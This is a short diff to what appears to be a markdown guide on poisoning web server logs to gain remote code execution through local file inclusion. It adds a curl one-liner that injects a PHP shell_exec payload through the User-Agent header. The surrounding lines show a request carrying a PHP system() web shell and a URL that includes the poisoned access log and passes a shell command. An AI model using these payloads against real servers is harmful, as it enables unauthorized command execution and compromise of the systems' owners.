@@ -28,6 +28,10 @@ Payload:
 
     GET /<?php system($_GET['cmd']); ?>
 
+Curl one-liner
+
+    curl -A "<?= shell_exec('id'); ?>" http://example.com/vulnerable.php
+
 ### 3) Execute via LFI
 
     http://example.com/vulnerable.php?page=/path/to/log/access.log&cmd=whoami
